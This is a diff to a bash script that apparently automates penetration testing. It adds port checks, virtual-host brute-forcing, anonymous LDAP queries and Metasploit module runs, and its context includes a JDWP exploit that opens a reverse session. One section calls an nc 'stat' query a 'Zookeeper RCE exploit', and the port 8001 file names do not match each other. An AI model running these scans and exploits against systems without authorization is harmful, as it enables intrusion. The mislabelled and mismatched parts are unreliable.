@@ -84,7 +84,7 @@ elif [ "$MODE" == "webscan" ]; then
 elif [ ! -z "$PORT" ]; then 
   nmap -sS -Pn -p $PORT --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
 else
-  nmap -sS --open -Pn $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
+  nmap -sS --open -p $DEFAULT_PORTS -Pn $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
 fi
   echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
   echo -e "$OKRED RUNNING UDP PORT SCAN $RESET"
@@ -114,6 +114,7 @@ port_135=`grep 'portid="135"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_137=`grep 'portid="137"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_139=`grep 'portid="139"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_162=`grep 'portid="162"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_264=`grep 'portid="264"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_389=`grep 'portid="389"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_443=`grep 'portid="443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_445=`grep 'portid="445"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
@@ -127,6 +128,7 @@ port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_1524=`grep 'portid="1524"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_2049=`grep 'portid="2049"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_2121=`grep 'portid="2121"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_2181=`grep 'portid="2181"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_3128=`grep 'portid="3128"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_3310=`grep 'portid="3310"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
@@ -141,6 +143,7 @@ port_5984=`grep 'portid="5984"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_7001=`grep 'portid="7001"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_8001=`grep 'portid="8001"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
@@ -413,12 +416,19 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
     python3 $PLUGINS_DIR/wig/wig.py -d -q http://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-http
     sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-http > $LOOT_DIR/web/wig-$TARGET-http.txt 2> /dev/null
+    rm -f $LOOT_DIR/web/wig-$TARGET-http 2> /dev/null
   fi
   if [ "$WEBTECH" = "1" ]; then
     echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
     echo -e "$OKRED GATHERING WEB FINGERPRINT $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
     webtech -u http://$TARGET | grep \- | cut -d- -f2- | tee $LOOT_DIR/web/webtech-$TARGET-http.txt
+  fi
+  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+  echo -e "$OKRED SCANNING FOR VIRTUAL HOSTS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+  if [ "$VHOSTS" == "1" ]; then
+    gobuster vhost -u http://$TARGET -w $INSTALL_DIR/wordlists/vhosts.txt -o $LOOT_DIR/osint/vhosts-http-$TARGET.txt  2> /dev/null
   fi
   if [ "$NMAP_SCRIPTS" == "1" ]; then
       echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
@@ -621,6 +631,22 @@ else
   fi
 fi
 
+if [ -z "$port_264" ];
+then
+  echo -e "$OKRED + -- --=[Port 264 closed... skipping.$RESET"
+else
+  echo -e "$OKORANGE + -- --=[Port 264 opened... running tests...$RESET"
+
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+    msfconsole -q -x "use auxiliary/gather/checkpoint_hostname; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-checkpoint_hostname.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-checkpoint_hostname.raw > $LOOT_DIR/output/msf-$TARGET-checkpoint_hostname.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-checkpoint_hostname.raw 2> /dev/null
+  fi
+fi
+
 if [ -z "$port_389" ];
 then
   echo -e "$OKRED + -- --=[Port 389 closed... skipping.$RESET"
@@ -632,6 +658,10 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
     nmap -A -p 389 -Pn --script=ldap*,/usr/share/nmap/scripts/vulscan/vulscan.nse,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port389.txt
   fi
+  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+  echo -e "$OKRED RUNNING LDAP ANONYMOUS SEARCH QUERY $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+  ldapsearch -h $TARGET 389 -x -s base -b '' "(objectClass=*)" "*" + | tee $LOOT_DIR/output/ldapsearch-$TARGET-port389.txt
 fi
 
 if [ -z "$port_443" ];
@@ -688,6 +718,7 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
     python3 $PLUGINS_DIR/wig/wig.py -d -q https://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-https
     sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-https > $LOOT_DIR/web/wig-$TARGET-https.txt 2> /dev/null
+    rm -f $LOOT_DIR/web/wig-$TARGET-https 2> /dev/null
   fi
   if [ "$WEBTECH" = "1" ]; then
     echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
@@ -702,6 +733,12 @@ else
     nmap -A -sV -Pn -p 443 --script=http-adobe-coldfusion-apsa1301,http-apache-server-status,http-aspnet-debug,http-auth-finder,http-auth,http-avaya-ipoffice-users,http-awstatstotals-exec,http-axis2-dir-traversal,http-backup-finder,http-barracuda-dir-traversal,http-bigip-cookie,http-brute,http-cakephp-version,http-chrono,http-config-backup,http-cookie-flags,http-cors,http-cross-domain-policy,http-csrf,http-date,http-default-accounts,http-devframework,http-dlink-backdoor,http-dombased-xss,http-domino-enum-passwords,http-drupal-enum-users,http-drupal-enum,http-errors,http-exif-spider,http-feed,http-fetch,http-fileupload-exploiter,http-form-brute,http-form-fuzzer,http-frontpage-login,http-generator,http-git,http-gitweb-projects-enum,http-google-malware,http-grep,http-headers,http-huawei-hg5xx-vuln,http-icloud-findmyiphone,http-icloud-sendmsg,http-iis-short-name-brute,http-iis-webdav-vuln,http-internal-ip-disclosure,http-joomla-brute,http-jsonp-detection,http-ls,http-majordomo2-dir-traversal,http-method-tamper,http-methods,http-mobileversion-checker,http-ntlm-info,http-open-proxy,http-open-redirect,http-passwd,http-php-version,http-phpmyadmin-dir-traversal,http-phpself-xss,http-proxy-brute,http-put,http-qnap-nas-info,http-rfi-spider,http-robots.txt,http-robtex-reverse-ip,http-robtex-shared-ns,http-security-headers,http-server-header,http-shellshock,http-sitemap-generator,http-sql-injection,http-stored-xss,http-svn-enum,http-svn-info,http-title,http-tplink-dir-traversal,http-trace,http-traceroute,http-trane-info,http-unsafe-output-escaping,http-userdir-enum,http-vhosts,http-virustotal,http-vlcstreamer-ls,http-vmware-path-vuln,http-vuln-cve2006-3392,http-vuln-cve2009-3960,http-vuln-cve2010-0738,http-vuln-cve2010-2861,http-vuln-cve2011-3192,http-vuln-cve2011-3368,http-vuln-cve2012-1823,http-vuln-cve2013-0156,http-vuln-cve2013-6786,http-vuln-cve2013-7091,http-vuln-cve2014-2126,http-vuln-cve2014-2127,http-vuln-cve2014-2128,http-vuln-cve2014-2129,http-vuln-cve2014-3704,http-vuln-cve2014-8877,http-vuln-cve2015-1427,http-vuln-cve2015-1635,http-vuln-cve2017-1001000,http-vuln-cve2017-5638,http-vuln-cve2017-5689,http-vuln-cve2017-8917,http-vuln-misfortune-cookie,http-vuln-wnr1000-creds,http-waf-detect,http-waf-fingerprint,http-webdav-scan,http-wordpress-brute,http-wordpress-enum,http-wordpress-users,http-xssed,/usr/share/nmap/scripts/vulscan/vulscan.nse,/usr/share/nmap/scripts/vulners -v $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port443
     sed -r "s/</\&lh\;/g" $LOOT_DIR/output/nmap-$TARGET-port443 2> /dev/null > $LOOT_DIR/output/nmap-$TARGET-port443.txt 2> /dev/null
     rm -f $LOOT_DIR/output/nmap-$TARGET-port443 2> /dev/null
+  fi  
+  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+  echo -e "$OKRED SCANNING FOR VIRTUAL HOSTS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+  if [ "$VHOSTS" == "1" ]; then
+    gobuster vhost -u https://$TARGET -w $INSTALL_DIR/wordlists/vhosts.txt -o $LOOT_DIR/osint/vhosts-https-$TARGET.txt  2> /dev/null
   fi
   if [ "$SSL" = "1" ]; then
     echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
@@ -891,6 +928,17 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
     smbclient -L $TARGET -U " "%" " 
   fi
+fi
+
+if [ -z "$port_2181" ];
+then
+  echo -e "$OKRED + -- --=[Port 2181 closed... skipping.$RESET"
+else
+  echo -e "$OKORANGE + -- --=[Port 2181 opened... running tests...$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+  echo -e "$OKRED RUNNING ZOOKEEPER RCE EXPLOIT $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+  echo stat | nc $TARGET 2181 | tee $LOOT_DIR/output/zookeeper-$TARGET-port2181.txt
 fi
 
 if [ -z "$port_3306" ];
@@ -1164,6 +1212,36 @@ else
     msfconsole -q -x "use exploit/multi/misc/java_jdwp_debugger; setg RHOSTS "$TARGET"; set RPORT 8000; set SSL false; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.raw
     sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.raw > $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.txt 2> /dev/null
     rm -f $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.raw 2> /dev/null
+  fi
+fi
+
+if [ -z "$port_8001" ];
+then
+  echo -e "$OKRED + -- --=[Port 8001 closed... skipping.$RESET"
+else
+  echo -e "$OKORANGE + -- --=[Port 8001 opened... running tests...$RESET"
+  if [ "$AMAP" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+    echo -e "$OKRED RUNNING AMAP $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+    amap $TARGET 8001 -A
+  fi
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+    nmap -A -sV -Pn -p 8001 --script=rmi-*,/usr/share/nmap/scripts/vulscan/vulscan.nse,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port8001.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}•x${OKGREEN}[`date +"%Y-%m-%d](%H:%M)"`${RESET}x•"
+    msfconsole -q -x "use gather/java_rmi_registry; set RHOST "$TARGET"; set RPORT 8001; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_registry.txt
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_registry.raw > $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_registry.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port1099-java_rmi_registry.raw 2> /dev/null
+    msfconsole -q -x "use scanner/misc/java_rmi_server; set RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_server.txt
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_server.raw > $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_server.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port8001-java_rmi_server.raw 2> /dev/null
   fi
 fi
 
